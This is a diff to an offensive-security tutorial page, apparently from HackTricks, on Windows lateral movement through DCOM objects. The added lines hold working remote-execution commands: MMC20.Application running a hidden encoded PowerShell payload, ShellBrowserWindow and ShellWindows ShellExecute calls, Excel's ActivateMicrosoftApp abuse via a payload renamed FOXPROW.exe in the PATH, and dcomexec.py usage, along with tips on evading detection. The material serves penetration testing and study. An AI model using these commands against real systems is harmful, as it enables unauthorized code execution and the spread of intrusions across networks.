@@ -2,6 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+DCOM lateral movement is attractive because it reuses existing COM servers exposed over RPC/DCOM instead of creating a service or scheduled task. In practice this means the initial connection usually starts on TCP/135 and then moves to dynamically assigned high RPC ports.
+
+## Prerequisites & Gotchas
+
+- You usually need a local administrator context on the target and the remote COM server must allow remote launch/activation.
+- Since **March 14, 2023**, Microsoft enforces DCOM hardening for supported systems. Old clients that request a low activation authentication level can fail unless they negotiate at least `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients are usually auto-raised, so current tooling normally keeps working.
+- Manual or scripted DCOM execution generally needs TCP/135 plus the target's dynamic RPC port range. If you are using Impacket's `dcomexec.py` and you want command output back, you usually also need SMB access to `ADMIN$` (or another writable/readable share).
+- If RPC/DCOM works but SMB is blocked, `dcomexec.py -nooutput` can still be useful for blind execution.
+
+Quick checks:
+
+```bash
+# Enumerate registered DCOM applications
+Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name
+
+# Useful to inspect firewall/RPC issues
+Test-NetConnection -ComputerName 10.10.10.10 -Port 135
+```
+
 ## MMC20.Application
 
 **For more info about this technique chech the original post from [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
@@ -33,12 +52,15 @@ Get RCE:
 
 ```bash
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
-$com | Get-Member
-
-# Then just run something like:
-
-ls \\10.10.10.10\c$\Users
+$com.Document.ActiveView.ExecuteShellCommand(
+    "cmd.exe",
+    $null,
+    "/c powershell -NoP -W Hidden -Enc <B64>",
+    "7"
+)
 ```
+
+The last argument is the window style. `7` keeps the window minimized. Operationally, MMC-based execution commonly leads to a remote `mmc.exe` process spawning your payload, which is different from the Explorer-backed objects below.
 
 ## ShellWindows & ShellBrowserWindow
 
@@ -47,6 +69,8 @@ ls \\10.10.10.10\c$\Users
 The **MMC20.Application** object was identified to lack explicit "LaunchPermissions," defaulting to permissions that permit Administrators access. For further details, a thread can be explored [here](https://twitter.com/tiraniddo/status/817532039771525120), and the usage of [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET for filtering objects without explicit Launch Permission is recommended.
 
 Two specific objects, `ShellBrowserWindow` and `ShellWindows`, were highlighted due to their lack of explicit Launch Permissions. The absence of a `LaunchPermission` registry entry under `HKCR:\AppID\{guid}` signifies no explicit permissions.
+
+Compared with `MMC20.Application`, these objects are often quieter from an OPSEC perspective because the command commonly ends up as a child of `explorer.exe` on the remote host instead of `mmc.exe`.
 
 ### ShellWindows
 
@@ -60,10 +84,22 @@ $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+```
 
-# Need to upload the file to execute
-$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
-$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
+### ShellBrowserWindow
+
+`ShellBrowserWindow` is similar, but you can instantiate it directly via its CLSID and pivot to `Document.Application.ShellExecute`:
+
+```bash
+$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
+$obj = [System.Activator]::CreateInstance($com)
+$obj.Document.Application.ShellExecute(
+    "cmd.exe",
+    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
+    "C:\\Windows\\System32",
+    $null,
+    0
+)
 ```
 
 ### Lateral Movement with Excel DCOM Objects
@@ -95,6 +131,35 @@ elseif ($Method -Match "ExcelDDE") {
 }
 ```
 
+Recent research expanded this area with `Excel.Application`'s `ActivateMicrosoftApp()` method. The key idea is that Excel can try to launch legacy Microsoft applications such as FoxPro, Schedule Plus, or Project by searching the system `PATH`. If an operator can place a payload with one of those expected names in a writable location that is part of the target's `PATH`, Excel will execute it.
+
+Requirements for this variation:
+
+- Local admin on the target
+- Excel installed on the target
+- Ability to write a payload to a writable directory in the target's `PATH`
+
+Practical example abusing the FoxPro lookup (`FOXPROW.exe`):
+
+```bash
+copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
+$com.ActivateMicrosoftApp("5")
+```
+
+If the attacking host does not have the local `Excel.Application` ProgID registered, instantiate the remote object by CLSID instead:
+
+```bash
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
+$com.Application.ActivateMicrosoftApp("5")
+```
+
+Values seen abused in practice:
+
+- `5` -> `FOXPROW.exe`
+- `6` -> `WINPROJ.exe`
+- `7` -> `SCHDPLUS.exe`
+
 ### Automation Tools for Lateral Movement
 
 Two tools are highlighted for automating these techniques:
@@ -116,10 +181,16 @@ SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\tem
 ## Automatic Tools
 
 - The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.
-- You can use Impacket's `dcomexec.py` to execute commands on remote systems using DCOM.
+- You can use Impacket's `dcomexec.py` to execute commands on remote systems using DCOM. Current builds support `ShellWindows`, `ShellBrowserWindow`, and `MMC20`, and default to `ShellWindows`.
 
 ```bash
 dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+
+# Pick the object explicitly
+dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
+
+# Blind execution when SMB/output retrieval is not available
+dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
 ```
 
 - You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):
@@ -138,8 +209,9 @@ SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\tem
 
 - [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 - [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
+- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
+- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
 
 
